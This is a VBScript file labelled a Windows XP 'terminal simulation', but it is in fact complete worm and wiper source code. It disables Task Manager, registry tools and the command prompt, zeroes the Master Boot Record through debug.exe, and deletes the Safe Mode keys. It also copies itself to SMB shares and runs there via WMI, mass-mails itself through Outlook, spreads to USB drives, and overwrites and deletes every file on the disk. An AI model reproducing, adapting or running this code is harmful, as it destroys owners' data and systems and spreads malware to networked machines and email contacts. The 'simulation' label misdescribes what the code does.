' --- Pleh.vbs: Final Windows XP Terminal Simulation ---
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Set app = CreateObject("Outlook.Application")
Set net = CreateObject("WScript.Network")
startTime = Timer()

' 1. ADMINISTRATIVE BLACKOUT: Immediate Lockdown
' On XP, these Registry writes execute instantly without prompts.
regP = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\"
shell.RegWrite regP & "System\DisableTaskMgr", 1, "REG_DWORD"
shell.RegWrite regP & "System\DisableRegistryTools", 1, "REG_DWORD"
shell.RegWrite regP & "Explorer\NoRun", 1, "REG_DWORD"
shell.RegWrite "HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD", 1, "REG_DWORD"

' 2. MBR KILL-SWITCH: XP Legacy Debug Logic
' Uses the native 16-bit debug.exe to zero out the Master Boot Record.
Set mbr = fso.CreateTextFile("C:\WINDOWS\system32\wipe.dat", True)
mbr.WriteLine "L 100 2 0 1"   : mbr.WriteLine "F 100 L 200 0" 
mbr.WriteLine "W 100 2 0 1"   : mbr.WriteLine "Q"
mbr.Close

' 3. PERSISTENCE & MESSAGING
sysPath = "C:\WINDOWS\Pleh.vbs"
fso.CopyFile WScript.ScriptFullName, sysPath
shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Pleh", sysPath

If Not fso.FolderExists("C:\look here") Then fso.CreateFolder("C:\look here")
Set note = fso.CreateTextFile("C:\look here\you must read.txt", True)
note.WriteLine "hello it's so pity that I can't look at your face now"
note.WriteLine "your machine was infected by links ratomorm"
note.Close

' 4. RESOURCE FORK BOMB: Windows App Loop
' Force-opens every application in System32 and Windows to freeze the UI.
Sub LaunchChaos(path)
  Set fol = fso.GetFolder(path)
  For Each file In fol.Files
    If LCase(fso.GetExtensionName(file.Path)) = "exe" Then
      shell.Run file.Path, 0, False ' Launch hidden/background
    End If
  Next
  For Each subf In fol.SubFolders: LaunchChaos(subf.Path): Next
End Sub

' 5. REGISTRY CORRUPTION: Disabling Safe Mode (XP Specific)
Sub CorruptReg()
    ' Removes the ability to boot into Safe Mode for recovery
    shell.RegDelete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\"
    shell.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"
    ' Floods the registry to cause hive bloat
    For i = 1 To 1000
        shell.RegWrite "HKLM\Software\Pleh\Null_" & i, String(2048, "X")
    Next
End Sub

' 6. PROPAGATION: SMB (Port 445) & Outlook Mass-Mailing
Sub SMBSpread()
    subnet = "192.168.1." 
    For i = 1 To 254
        target = subnet & i
        remotePath = "\\" & target & "\C$\WINDOWS\Pleh.vbs"
        fso.CopyFile sysPath, remotePath
        If fso.FileExists(remotePath) Then
            ' Remote execution via WMI (Native in XP)
            shell.Run "wmic /node:""" & target & """ process call create ""wscript.exe C:\WINDOWS\Pleh.vbs""", 0
        End If
    Next
End Sub

If TypeName(app) = "Application" Then
  Set mapi = app.GetNameSpace("MAPI")
  For Each list In mapi.AddressLists
    For i = 1 To list.AddressEntries.Count
      Set mail = app.CreateItem(0): mail.To = list.AddressEntries(i).Address
      mail.Subject = "I hate you": mail.Body = "Check this out.": mail.Attachments.Add(WScript.ScriptFullName)
      mail.Send
    Next
  Next
End If

' 7. DESTRUCTIVE PAYLOAD: Scorched Earth Root Wipe
Sub InfectAndDestroy(folderPath)
  Set fol = fso.GetFolder(folderPath)
  For Each file In fol.Files
    ' Overwrite EVERYTHING
    Set target = fso.OpenTextFile(file.Path, 2, True)
    target.Write fso.OpenTextFile(WScript.ScriptFullName).ReadAll: target.Close
    fso.MoveFile file.Path, file.Path & ".pleh": fso.DeleteFile file.Path & ".pleh"
  Next
  For Each subfolder In fol.SubFolders: InfectAndDestroy(subfolder.Path): Next
End Sub

' --- INITIAL ATTACK SEQUENCE ---
SMBSpread()
LaunchChaos("C:\WINDOWS") ' CPU Exhaustion
InfectAndDestroy("C:\")

' --- ETERNAL MONITORING LOOP ---
Do
  ' Delayed Registry Corruption (20-second timer)
  If Timer() - startTime > 20 Then CorruptReg()

  ' Persistence for MBR destruction (Debug call)
  shell.Run "debug < C:\WINDOWS\system32\wipe.dat", 0
  
  ' Real-time USB hijacking
  For Each drive In fso.Drives
    If drive.DriveType = 1 And drive.IsReady Then
        dest = drive.Path & "\I_Hate_You.txt.vbs"
        If Not fso.FileExists(dest) Then
            fso.CopyFile WScript.ScriptFullName, dest
            InfectAndDestroy(drive.Path)
        End If
    End If
  Next
  
  ' Keep opening apps to ensure the PC stays locked until the MBR wipe is verified
  LaunchChaos("C:\WINDOWS\system32")
  WScript.Sleep 5000 
Loop
